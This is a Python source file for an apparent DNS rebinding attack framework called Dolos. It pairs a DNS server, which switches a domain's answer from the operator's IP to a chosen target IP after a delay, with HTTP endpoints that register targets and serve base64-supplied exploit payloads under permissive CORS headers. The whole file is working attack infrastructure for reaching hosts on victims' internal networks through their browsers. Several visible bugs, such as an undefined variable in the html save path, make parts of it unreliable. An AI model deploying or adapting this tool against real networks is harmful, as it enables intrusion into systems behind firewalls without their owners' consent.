from socket import inet_aton, gaierror, gethostbyname
from os import makedirs, listdir
from os.path import exists, getmtime
from urllib.parse import parse_qsl, urlparse
from re import match
from dnslib import DNSError, DNSRecord, QTYPE, RR, A
from time import time, asctime
from socketserver import ThreadingMixIn, BaseRequestHandler, UDPServer
from threading import Thread
from http.server import BaseHTTPRequestHandler, HTTPServer
from binascii import Error as BinasciiError
from base64 import b64decode, b64encode
from uuid import uuid4
from configparser import ConfigParser


def log_http(msg):
    print(asctime(), "[http] " + msg)


def log_dns(msg):
    print(asctime(), "[dns] " + msg)


""" DolosHTTPHandler defines HTTP behavior """


class DolosHTTPHandler(BaseHTTPRequestHandler):
    params = {}
    server_version = "Dolos DNS Rebinding Framework"
    sys_version = ""

    def log_request(self, code="-", size="-"):
        log_http(
            "Client: %s:%d, Path: %s, Status: %s"
            % (self.client_address[0], self.client_address[1], self.path, code)
        )

    """ Define handlers for specific HTTP endpoints
    do_POST and do_GET dispatch handler functions from a dict
    """

    def do_POST(self):
        (path, query, self._params) = self._path_split()
        paths = {
            "/init": self._init,
            "/rebind": self._rebind,
            "/exploit": self._exploit,
        }

        if path in paths:
            self.wfile.write(paths[path]())
        else:
            self._set_response(404)
            self.wfile.write(b"Not Found")

    def do_GET(self):
        (path, query, self._params) = self._path_split()
        log_http("[%s] GET request received: %s" % (self.server.server_name, path))
        paths = {
            "/init": self._init,
            "/rebind": self._rebind,
            "/exploit": self._exploit,
            "/gui": self._gui,
            "/favicon.ico": self._favicon,
        }

        if path in paths:
            self.wfile.write(paths[path]())
        else:
            self._set_response(404)
            self.wfile.write(b"Not Found")

    """ This function parses query strings from request body """

    def _body_params(self):
        header_name = None
        for name in self.headers.keys():
            if name.lower() == "content-length":
                header_name = name
                break
        if header_name is None:
            return {}
        try:
            content_len = int(self.headers.get(header_name))
        except ValueError:
            return {}
        request_params = str(self.rfile.read(content_len), "utf-8")
        return parse_qsl(request_params)

    """ _path_split() parses the supplied request elements/parameters. """

    def _path_split(self):
        request_url = urlparse(self.path)
        body_params = dict(self._body_params())
        query_params = dict(parse_qsl(request_url.query))
        # body_params override query parameters:
        params = {**query_params, **body_params}
        return (request_url.path, request_url.query, params)

    """ Rebind domains should allow cross-origin requests. """

    def setPermissiveHeaders(self):
        self.setDefaultHeaders()
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Headers", "user-agent, referer")
        self.send_header("Access-Control-Allow-Methods", "POST, PUT, GET, HEAD")

    """ No responses should get cached or use keep-alive connections. """

    def setDefaultHeaders(self):
        self.send_header("Connection", "close")
        self.send_header("Cache-Control", "no-cache")

    """ This is a wrapper for setting a status code and preparing headers. """

    def _set_response(self, code=200, permissive=False):
        self.send_response(code)
        if permissive:
            self.setPermissiveHeaders()
        else:
            self.setDefaultHeaders()
        self.end_headers()

    """ _init() handles requests to /init
    /init has three modes: Loading, Assisted Creation, and Raw Creation
    If 'load=ProfileName', send 'data/profiles/ProfileName'
    If 'ip_callback=<base64>' is supplied, a payload is generated template
        - faint_mode (optional) controls enumeration mode
        - save=ProfileName will save into 'data/profiles/ProfileName'
    If 'html=<base64>', decoded payload is sent
        - save=ProfileName will save into 'data/profiles/ProfileName'
    """

    def _init(self):
        params = self._params
        if "load" in params:
            load_value = params["load"]
            if not load_value.isalnum():
                self._set_response(500)
                return bytes("Improper profile characters", "UTF-8")
            else:
                profile_path = "data/profiles/%s" % (load_value)
                try:
                    profile_data = open(profile_path, "r").read()
                except FileNotFoundError:
                    self._set_response(404)
                    return bytes("Profile not found", "UTF-8")
                self._set_response(200, permissive=True)
                return bytes(profile_data, "UTF-8")
        if "ip_callback" in params:
            faint_oracle_mode = 1
            try:
                easy_template = open("easy_template.html", "r").read()
            except FileNotFoundError:
                self._set_response(404)
                return bytes("The easy template was not installed.", "UTF-8")
            try:
                cb_fn = b64decode(params["ip_callback"].replace(" ", "+"))
            except BinasciiError:
                self._set_response(500)
                return bytes("Callback function had improper encoding.", "UTF-8")
            if "faint_mode" in params:
                try:
                    faint_oracle_mode = int(params["faint_mode"])
                except ValueError:
                    faint_oracle_mode = 1
            self._set_response(200, permissive=True)
            response = easy_template.replace("%IP_CALLBACK%", str(cb_fn, "UTF-8"))
            response = response.replace("%FAINTMODE%", str(faint_oracle_mode))
            if "save" in params:
                if params["save"].isalnum():
                    makedirs("data/profiles")
                    open("data/profiles/%s" % (params["save"]), "w").write(response)
                else:
                    self._set_response(500)
                    return bytes("Save name must be alphanumeric.", "UTF-8")
            return bytes(response, "UTF-8")
        if "html" in params:
            try:
                html_code = b64decode(params["html"].replace(" ", "+"))
            except BinasciiError:
                self._set_response(500)
                return bytes("Unable to decode html parameter.", "UTF-8")
            if "save" in params:
                if params["save"].isalnum():
                    open("data/profiles/%s" % (params["save"]), "w").write(response)
                else:
                    self._set_response(500)
                    return bytes("The save name isn't alphanumeric.", "UTF-8")
            self._set_response(200, True)
            return html_code
        return bytes("init called without a valid operation.", "UTF-8")

    """ _rebind() handles calls to /rebind

    /rebind is the endpoint for creating a domain label for rebinding.

    Parameters for /rebind are ip_addr, port_number, and exploit_payload
    ip_addr is the target address for the rebinding.
    port_number indicates what port the HTTP server must listen on.
    exploit_payload is a base64 encoded document for the rebind domain

    Successful invocation of /rebind gets a 307 HTTP redirect
    to the rebind domain/port.
    """

    def _rebind(self):
        params = self._params
        # Request new domain label for target IP from params
        # Create data/hostname/exploit.payload with payload
        # send 307 temporary redirect to domain/exploit
        try:
            ip_addr = params["ip_addr"]
            port_number = params["port_number"]
            exploit_payload = params["exploit_payload"]
        except KeyError as e:
            self._set_response(500)
            return bytes("Missing parameter %s" % (e), "UTF-8")
        try:
            exploit_decode = b64decode(exploit_payload.replace(" ", "+"))
        except BinasciiError:
            self._set_response(500)
            return bytes("Failed to decode exploit_payload.", "UTF-8")
        if not port_number.isnumeric():
            self._set_response(500)
            return bytes("Invalid port number", "UTF-8")
        # Start the server before the /exploit request
        if not exists("data/ports/%s" % (port_number)):
            makedirs("data/ports/%s" % (port_number))
            start_dolos_on_port("0.0.0.0", port_number, self.server.server_name)
        try:
            inet_aton(ip_addr)
        except OSError:
            self._set_response(500)
            return bytes("Invalid ip_addr supplied.", "UTF-8")
        domain_label = self._get_new_label()
        if not domain_label:
            self._set_response(500)
            return bytes("Unable to generate a rebind label", "UTF-8")
        domain_path = "data/domains/%s" % (domain_label)
        makedirs(domain_path)
        open(domain_path + "/exploit.payload", "w").write(str(exploit_decode, "UTF-8"))
        open(domain_path + "/target.ip", "w").write(ip_addr)

        # Record the optional static_response_list parameter
        static_responses = ""
        if "static_response_list" in params:
            static_responses = params["static_response_list"]
        open(domain_path + "/static_responses", "w").write(static_responses)

        domain_name = "%s.%s" % (domain_label, self.server.server_name)
        self.send_response(307)
        self.setPermissiveHeaders()
        self.send_header(
            "Location", "http://%s:%s/exploit" % (domain_name, port_number)
        )
        self.end_headers()
        return bytes("go rebind", "UTF-8")

    """ _exploit() handles calls to /exploit

    There are no HTTP parameters for /exploit

    Response is the exploit.payload for the Host: domain
    """

    def _exploit(self):
        log_http("Received /exploit request")
        # Send data/domains/hostname_label/exploit.payload
        hostname = self.headers.get("Host")

        # Filter the hostname value for allowed characters:
        if not hostname or not match("^[0-9a-zA-Z-.:]+$", hostname):
            self.send_response(500)
            return bytes("Invalid hostname.", "UTF-8")

        # Sanitize the hostname to remove traversal attempts:
        domain_label = hostname.split(".")[0]
        try:
            exploit = open("data/domains/%s/exploit.payload" % (domain_label)).read()
            log_http("Sending %d bytes on %s (/exploit)" % (len(exploit), hostname))
            self._set_response(200, permissive=True)
            return bytes(exploit, "utf-8")
        except FileNotFoundError:
            log_http("Exploit payload not found.")
            self.send_response(500)
            return bytes("Domain not found.")
        log_http("Misfire on /exploit (host: %s)" % (hostname))
        return bytes("Something misfired.", "UTF-8")

    """ _gui() handles calls to /gui
    This page simply sends a canned HTML page to interface with /init

    The 'advanced' parameter gives rebind_advanced_gui.html
    """

    def _gui(self):
        params = self._params
        self._set_response(200)

        try:
            if params.get("advanced", "0") == 1:
                gui_file = open("rebind_advanced_gui.html").read()
            else:
                gui_file = open("rebind_easy_gui.html").read()
        except FileNotFoundError:
            gui_file = "<TITLE>ERROR</TITLE>GUI Missing..."
        return bytes(gui_file, "UTF-8")

    """ _favicon() handles requests to /favicon.ico

    This is only here to stop browsers from repeatedly requesting favicon.ico
    """

    def _favicon(self):
        self._set_response(200)
        self.send_header("Content-Type", "image/x-icon")
        try:
            icon = open("favicon.ico", "rb").read()
        except FileNotFoundError:
            icon = b""
        return icon

    """ Simple helper function for finding unused uuid """

    def _get_new_label(self):
        for count in range(0, 3):
            candidate = uuid4()
            if not exists("data/domains/%s" % (candidate)):
                return candidate
        log_http("Unable to produce new domain label.")
        return None


class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    pass


""" HTTP Server Control Functions """


def start_dolos_on_port(listen_host, port_string, rebind_domain):
    try:
        port_number = int(port_string)
    except ValueError:
        log_http("Invalid port string: %s" % (port_string))
        return
    log_http("Adding listener on port %d for %s" % (port_number, rebind_domain))
    httpd = ThreadingHTTPServer((listen_host, port_number), DolosHTTPHandler)
    httpd.server_name = rebind_domain
    httpd.serve_forever()


def startDolosHTTP(listen_host, default_port, rebind_domain):
    try:
        listdir("data/ports")
    except FileNotFoundError:
        makedirs("data/ports")
    ports = listdir("data/ports")
    if ports == []:
        ports = [default_port]
    for port in ports:
        Thread(
            target=start_dolos_on_port, args=[listen_host, port, rebind_domain]
        ).start()


""" DNS Server Functionality """


class DnsRequestHandler(BaseRequestHandler):

    """ handle() processes incoming DNS requests.
    Handles A records for known domain only. Others ignored.
    A record lookups under the rebinding domain will trigger a lookup for:
        data/domains/label
    If that path does not exist, the public IP is sent.
    """

    def handle(self):
        public_ip = self.server.public_ip
        data = self.request[0].strip()
        socket = self.request[1]
        try:
            d = DNSRecord.parse(data)
        except DNSError:
            log_dns("Error Bytes: %s" % (repr(data)))
            return
        try:
            query_label = b".".join(d.q.qname.label).decode("utf-8")
        except UnicodeDecodeError as err:
            log_dns("UnicodeDecodeError on DNS query")
            query_label = ""

        if d.header.get_opcode() != 0:
            log_dns(
                "Ignoring packet because opcode %d is not supported."
                % (d.header.get_opcode())
            )
        elif not query_label.endswith(self.server.rebind_domain):
            log_dns("Mismatched domain ignored (label: %s)" % (query_label))
        else:
            log_dns("Query %s" % (query_label))
            answer = d.reply()
            subdomain_path = "data/domains/%s" % (query_label.split(".")[0])
            target_ip_file = "%s/target.ip" % (subdomain_path)
            query_tag = "%s/queried" % (subdomain_path)
            if not exists(subdomain_path) or not exists(target_ip_file):
                answer.add_answer(RR(query_label, QTYPE.A, rdata=A(public_ip), ttl=1))
                log_dns("Responding with public IP (domain: %s)" % (query_label))
            elif exists(query_tag) and getmtime(query_tag) + 15 <= time():
                ip = open(target_ip_file, "r").read()
                log_dns(
                    "Responding with target_ip '%s' (domain: %s)" % (ip, query_label)
                )
                answer.add_answer(RR(query_label, QTYPE.A, rdata=A(ip), ttl=1))
            else:
                if not exists(query_tag):
                    open(query_tag, "w").write("")
                log_dns(
                    "Responding with Dolos public IP '%s' (domain: %s)"
                    % (public_ip, query_label)
                )
                answer.add_answer(RR(query_label, QTYPE.A, rdata=A(public_ip), ttl=1))

            socket.sendto(answer.pack(), self.client_address)


class ThreadedUDPServer(ThreadingMixIn, UDPServer):
    rebind_domain = None
    public_ip = None
    pass


""" DNS Server Process Control """


def startDNS(rebind_domain, listen_host, public_ip):
    HOST, PORT = listen_host, 53

    dns_server = ThreadedUDPServer((listen_host, 53), DnsRequestHandler)
    dns_server.request_queue_size = 128
    dns_server.rebind_domain = rebind_domain
    dns_server.public_ip = public_ip
    dns_server_thread = Thread(target=dns_server.serve_forever)
    dns_server_thread.daemon = True

    dns_server_thread.start()
    log_dns("Listening on udp/53")


""" Startup Dolos Service """
if __name__ == "__main__":
    config = ConfigParser()
    config.read("dolos.conf")
    try:
        settings = config["GENERAL"]
    except KeyError:
        print("Invalid dolos.conf")
        quit()

    rebind_domain = settings.get("domain")
    if not rebind_domain:
        print("Unavailable domain setting.")
        quit()

    listen_host = settings.get("listen_host", "0.0.0.0")
    try:
        public_ip = gethostbyname(settings.get("ns_addr"))
    except gaierror:
        print("Unable to identify nameserver IP")
        quit()

    default_http_port = settings.getint("http_port", 9000)

    startDNS(rebind_domain, listen_host, public_ip)
    startDolosHTTP(listen_host, default_http_port, rebind_domain)
